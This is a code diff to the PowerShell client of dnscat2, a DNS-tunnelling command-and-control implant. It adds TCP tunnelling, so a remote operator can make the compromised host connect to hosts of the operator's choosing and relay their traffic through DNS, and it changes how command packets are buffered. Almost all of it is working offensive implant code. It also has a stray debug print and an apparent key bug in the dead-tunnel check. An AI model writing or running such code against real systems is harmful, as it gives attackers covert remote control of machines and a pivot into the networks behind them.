@@ -102,8 +102,7 @@ function ConvertTo-Dnscat2Packet ($RawPacket) {
         "01" {
             $Packet["SequenceNumber"] = ($RawPacket[10..13] -join "")
             $Packet["AcknowledgementNumber"] = ($RawPacket[14..17] -join "")
-            $Packet["Data"] = $RawPacket[18..$RawPacket.Length] -join ""
-
+            $Packet["Data"] = ($RawPacket[18..$RawPacket.Length] -join "")
           }
         "02" {
             $Packet["Reason"] = ($RawPacket[10..$RawPacket.Length] -join "")
@@ -142,6 +141,9 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
         $Session["IsResponse"] = ""
         $Session["CommandId"] = ""
         $Session["CommandFields"] = ""
+        $Session["CommandPacketBuffer"] = ""
+        $Session["Tunnels"] = New-Object System.Collections.Hashtable
+        $Session["DeadTunnels"] = @()
     } elseif ($Driver -eq "exec") {
         $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
         $ProcessStartInfo.FileName = $DriverOptions
@@ -169,25 +171,127 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
     return $Session
 }
 
-function Update-Dnscat2CommandSession ($Data, $Session) {
+function New-Dnscat2Tunnel ($Session, $TunnelId) {
+    $Socket = New-Object System.Net.Sockets.TcpClient
+    $Handle = $Socket.BeginConnect($Session["Tunnels"][$TunnelId].Host,$Session["Tunnels"][$TunnelId].Port,$null,$null)
+    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+    while ($True) {
+        if($Handle.IsCompleted) {
+            try {
+                $Socket.EndConnect($Handle)
+                $Stream = $Socket.GetStream()
+                $BufferSize = $Socket.ReceiveBufferSize
+                break
+            } catch {
+                $Socket.Close()
+                $Stopwatch.Stop()
+                $Session["Tunnels"][$TunnelId].Add("Dead", $True)
+                return $Session
+            }
+        }
+        if($Stopwatch.Elapsed.TotalSeconds -gt 10) {
+            $Socket.Close()
+            $Stopwatch.Stop()
+            $Session["Tunnels"][$TunnelId].Add("Dead", $True)
+            return $Session
+        }
+        Sleep -Milliseconds 100
+    }
+    
+    $Session["Tunnels"][$TunnelId].Add("Stream", $Stream)
+    $Session["Tunnels"][$TunnelId].Add("Socket", $Socket)
+    $Session["Tunnels"][$TunnelId].Add("BufferSize", $BufferSize)
+    $Session["Tunnels"][$TunnelId].Add("StreamDestinationBuffer", (New-Object System.Byte[] $Session["Tunnels"][$TunnelId]["BufferSize"]))
+    $Session["Tunnels"][$TunnelId].Add("StreamReadOperation", $Session["Tunnels"][$TunnelId]["Stream"].BeginRead($Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"], 0, $Session["Tunnels"][$TunnelId]["BufferSize"], $null, $null))
+    $Session["Tunnels"][$TunnelId].Add("StreamBytesRead", 1)
+    $Session["Tunnels"][$TunnelId].Add("Dead", $False)
+    
+    return $Session
+}
 
-    ## PROCESS COMMAND PACKET
-    if ($Session["RemainingBytes"] -eq 0) { # A new packet has arrived!
-        # Decode Command Packet
-        $Session["Length"] = [Convert]::ToUInt32($Data[0..7] -join '', 16)
-        $Session["PacketId"] = $Data[8..11] -join ''
-        $Session["PacketIdBF"] = [Convert]::ToString(([convert]::ToUInt16($Data[8..11] -join '', 16) -bxor ([Math]::Floor(1 * [Math]::Pow(2,15)))),16)
-        $Session["IsResponse"] = (($Session["PacketId"] -band [Math]::Floor(1 * [Math]::Pow(2,15))) -eq ([Math]::Floor(1 * [Math]::Pow(2,15))))
-        $Session["CommandId"] = $Data[12..15] -join ''
-        $Session["CommandFields"] = $Data[16..$Data.Length] -join ''
-        $Session["RemainingBytes"] = ($Session["Length"] - 4 - ($Session["CommandFields"].Length / 2))
-    } else {
-        # Is it possible to send multiple command packets in one dnscat2 packet?
-        # If so there will be problems here
-        while (($Session["RemainingBytes"] -gt 0) -and ($Data.Length -gt 0)) {
-            $Session["CommandFields"] += $Data[0..1] -join ''
+function Read-FromDnscat2Tunnel ($Session, $TunnelId) {
+    if ($Session["Tunnels"][$TunnelId]["StreamBytesRead"] -eq 0) {
+        $Session["Tunnels"][$TunnelId].Dead = $True; return $Session
+    }
+    if ($Session["Tunnels"][$TunnelId]["StreamReadOperation"].IsCompleted) {
+        $Session["Tunnels"][$TunnelId]["StreamBytesRead"] = $Session["Tunnels"][$TunnelId]["Stream"].EndRead($Session["Tunnels"][$TunnelId]["StreamReadOperation"])
+        if($Session["Tunnels"][$TunnelId]["StreamBytesRead"] -eq 0){ $Session["Tunnels"][$TunnelId].Dead = $True; return $Session }
+        $Data = $Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"][0..([int]($Session["Tunnels"][$TunnelId]["StreamBytesRead"])-1)]
+        $Session["Tunnels"][$TunnelId]["StreamReadOperation"] = $Session["Tunnels"][$TunnelId]["Stream"].BeginRead($Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"], 0, $Session["Tunnels"][$TunnelId]["BufferSize"], $null, $null)
+
+        # Queue tunnel packets
+        $Data = ([System.BitConverter]::ToString($Data) -replace '-')
+        $PacketId = (New-RandomDNSField)
+        $PacketId = ([Convert]::ToString(([convert]::ToUInt16($PacketId, 16) -band ( -bnot [uint16]([Math]::Floor(1 * [Math]::Pow(2,15))))),16)).PadLeft(4, '0')
+        $PacketLengthField = ([Convert]::ToString(($PacketId.Length/2 + 2 + $TunnelId.Length/2 + $Data.Length/2),16)).PadLeft(8, '0')
+        $DriverData = ($PacketLengthField + $PacketId + "1001" + $TunnelId + $Data)
+        $Session["DriverDataQueue"] += $DriverData
+    }
+    return $Session
+}
+
+function Send-ToDnscat2Tunnel ($Session, $TunnelId, $Data) {
+    try {
+        [byte[]]$Bytes = @()
+        while ($Data.Length -gt 0) {
+            $Bytes += [Convert]::ToInt16(($Data[0..1] -join ""),16)
             $Data = $Data.Substring(2)
-            $Session["RemainingBytes"] -= 1
+        }
+        $Session["Tunnels"][$TunnelId]["Stream"].Write($Bytes, 0, $Bytes.Length)
+    } catch {
+        $Session["Tunnels"][$TunnelId].Dead = $True
+    }
+    return $Session
+}
+
+function Close-Dnscat2Tunnel ($Session, $TunnelId) {
+    try { $Session["Tunnels"][$TunnelId].Dead = $True } catch { }
+    try { $Session["Tunnels"][$TunnelId]["Stream"].Close() } catch { }
+    try { $Session["Tunnels"][$TunnelId]["Socket"].Close() } catch { }
+    return $Session
+}
+
+function Update-Dnscat2CommandSession ($Session) {
+
+    if ($Session["CommandPacketBuffer"].Length -le 0) {
+        return $Session
+    }
+
+    ## PROCESS COMMAND PACKETS
+    while ($Session["CommandPacketBuffer"].Length -gt 0) {
+        # Packet Header
+        if (($Session["RemainingBytes"] -eq 0) -and ($Session["CommandPacketBuffer"].Length -ge 16)) {
+            # Decode Command Packet Header
+            $Session["Length"] = [Convert]::ToUInt32($Session["CommandPacketBuffer"][0..7] -join '', 16)
+            $Session["PacketId"] = $Session["CommandPacketBuffer"][8..11] -join ''
+            $Session["PacketIdBF"] = [Convert]::ToString(([convert]::ToUInt16($Session["CommandPacketBuffer"][8..11] -join '', 16) -bxor ([Math]::Floor(1 * [Math]::Pow(2,15)))),16)
+            $Session["CommandId"] = $Session["CommandPacketBuffer"][12..15] -join ''
+            $Session["RemainingBytes"] = ($Session["Length"] - 4)
+            $Session["CommandPacketBuffer"] = $Session["CommandPacketBuffer"].Substring(16)
+            $Session["CommandFields"] = ""
+        } elseif ($Session["RemainingBytes"] -gt 0) { # Packet Data
+            if ($Session.RemainingBytes*2 -ge $Session["CommandPacketBuffer"].Length) {
+                # length of remaining command packet is -ge remaining data buffer
+                # We can just grab the rest of the packet buffer
+                $Session["CommandFields"] += $Session["CommandPacketBuffer"]
+                $Session["RemainingBytes"] -= $Session["CommandPacketBuffer"].Length/2
+                $Session["CommandPacketBuffer"] = ""
+            } else {
+                # length of remaining command packet is -lt remaining data buffer
+                # We have another packet header in the buffer!
+                $Session["CommandFields"] += $Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)
+                $RemainingBytes = $Session.RemainingBytes*2
+                $Session["RemainingBytes"] -= ($Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)).Length/2
+                $Session["CommandPacketBuffer"] = $Session["CommandPacketBuffer"].Substring($RemainingBytes)
+            }
+            
+            if ($Session["RemainingBytes"] -eq 0) { # If we've completed a packet, lets send it right now
+                break
+            }
+        } else {
+            # Happens when a piece of a packet header remains in the buffer
+            # We should wait until the whole header is in the buffer before processing
+            break
         }
     }
 
@@ -197,16 +301,10 @@ function Update-Dnscat2CommandSession ($Data, $Session) {
         {
             "0000" # COMMAND_PING
             {
-                if ($Session.IsResponse) {
-                    Write-Host -n $Session["CommandFields"]
-                } else {
-                    #$PacketLengthField = ([Convert]::ToString((8 + $Session.CommandFields.Length),16)).PadLeft(8, '0')
-                    $PacketLengthField = ([Convert]::ToString((4 + $Session.CommandFields.Length/2),16)).PadLeft(8, '0')
-                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0000" + $Session.CommandFields)
-                    
-
-                    $Session["DriverDataQueue"] += $DriverData
-                }
+                #$PacketLengthField = ([Convert]::ToString((8 + $Session.CommandFields.Length),16)).PadLeft(8, '0')
+                $PacketLengthField = ([Convert]::ToString((4 + $Session.CommandFields.Length/2),16)).PadLeft(8, '0')
+                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0000" + $Session.CommandFields)
+                $Session["DriverDataQueue"] += $DriverData
                 return $Session
             }
             "0001" # COMMAND_SHELL
@@ -253,10 +351,10 @@ function Update-Dnscat2CommandSession ($Data, $Session) {
                     }
                     [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
                 } catch {
-                    $ErrorCode = "7FFF"
+                    $ErrorCode = $CommandId
                     $Reason = ((ConvertTo-HexArray "Could not write file") -join "") + "00"
                     $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
-                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)
+                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0004" + $ErrorCode + $Reason)
                     $Session["DriverDataQueue"] += $DriverData
                 }
             }
@@ -267,6 +365,48 @@ function Update-Dnscat2CommandSession ($Data, $Session) {
                     Write-Host ('New Delay: ' + $Session["Delay"].ToString())
                 } catch {}
                 
+            }
+            "1000" # TUNNEL_CONNECT
+            {
+                try {
+                    $Tunnel = New-Object System.Collections.Hashtable
+                    $Tunnel.Add("Host", (Convert-HexString $Session["CommandFields"].Substring(0, $Session["CommandFields"].Length - 4)).Trim(0))
+                    $Tunnel.Add("Port", [Convert]::ToUInt16($Session["CommandFields"].Substring($Session["CommandFields"].Length - 4), 16))
+                    $Tunnel.Add("TunnelId", ((New-RandomDNSField) + (New-RandomDNSField)))
+                    $Session["Tunnels"].Add($Tunnel.TunnelId, $Tunnel)
+                    
+                    ## START UP TUNNEL
+                    $Session = New-Dnscat2Tunnel $Session $Tunnel.TunnelId
+
+                    if ($Session["Tunnels"][$Tunnel.TunnelId].Dead) {
+                        $ErrorCode = $CommandId
+                        $Reason = ((ConvertTo-HexArray "Failed to start tunnel") -join "") + "00"
+                        $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
+                        $DriverData = ($PacketLengthField + $Session.PacketIdBF + "1000" + $ErrorCode + $Reason)
+                        $Session["DriverDataQueue"] += $DriverData
+                    }
+                    
+                    $DriverData = ("00000008" + $Session.PacketIdBF + "1000" + $Tunnel.TunnelId)
+                    $Session["DriverDataQueue"] += $DriverData
+                } catch {
+                    $ErrorCode = $CommandId
+                    $Reason = ((ConvertTo-HexArray "Failed to start tunnel") -join "") + "00"
+                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
+                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "1000" + $ErrorCode + $Reason)
+                    $Session["DriverDataQueue"] += $DriverData
+                }
+            }
+            "1001" # TUNNEL_DATA
+            {
+                $TunnelId = $Session["CommandFields"].Substring(0, 8)
+                $Data = $Session["CommandFields"].Substring(8)                
+                $Session = Send-ToDnscat2Tunnel $Session $TunnelId $Data
+            }
+            "1002" # TUNNEL_CLOSE
+            {
+                write-host 'a'
+                $TunnelId = $Session["CommandFields"]
+                $Session = Close-Dnscat2Tunnel $Session $TunnelId
             }
         }
     }
@@ -282,6 +422,28 @@ function Read-DataFromDriver ($Session) {
         }
         $Session["DriverDataQueue"] += (ConvertTo-HexArray $Data) -join ""
         return $Session
+    } elseif ($Session["Driver"] -eq "command") {
+    
+        # Tunnels are the only time a command session sends data without a prior request
+        if ($Session["Tunnels"].Count -gt 0) {
+            # Update Tunnels
+            $TunnelIds = @()
+            $TunnelIds += $Session["Tunnels"].Keys
+            foreach ($TunnelId in $TunnelIds) {
+                $Session = Read-FromDnscat2Tunnel $Session $TunnelId
+                
+                if ($Session[$TunnelId].Dead) {
+                    $Session["DeadTunnels"] += $TunnelId
+                }
+            }
+            
+            # Remove Dead Tunnels
+            foreach ($TunnelId in $Session["DeadTunnels"]) {
+                $Session["Tunnels"].Remove($TunnelId)
+            }
+            $Session["DeadTunnels"] = @()
+        }
+        
     } elseif ($Session["Driver"] -eq "exec") {
         if($Host.UI.RawUI.KeyAvailable) {
             $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
@@ -304,12 +466,11 @@ function Read-DataFromDriver ($Session) {
 }
 
 function Send-DataToDriver ($Data, $Session) {
-
     if ($Session["Driver"] -eq "console") {
         $StringData = Convert-HexString $Data
         Write-Host -n $StringData
-    } elseif (($Session["Driver"] -eq "command") -and $Data.Length -gt 8) {
-        $Session = Update-Dnscat2CommandSession $Data $Session
+    } elseif ($Session["Driver"] -eq "command") {
+        $Session["CommandPacketBuffer"] += $Data
     } elseif ($Session["Driver"] -eq "exec") {
         $StringData = Convert-HexString $Data
         ($Session["Process"]).StandardInput.WriteLine($StringData.TrimEnd("`r").TrimEnd("`n"))
@@ -375,6 +536,10 @@ function Update-Dnscat2Session ($Session) {
             Write-Verbose "HOST: Caught error while processing packet, dropping..."
 			$Session.Dead = $True 
 			$Session = Stop-Dnscat2Session $Session
+        }
+        
+        if ($Session.Driver -eq "command") {
+            $Session = Update-Dnscat2CommandSession $Session
         }
     } catch {
         $Session.Dead = $True
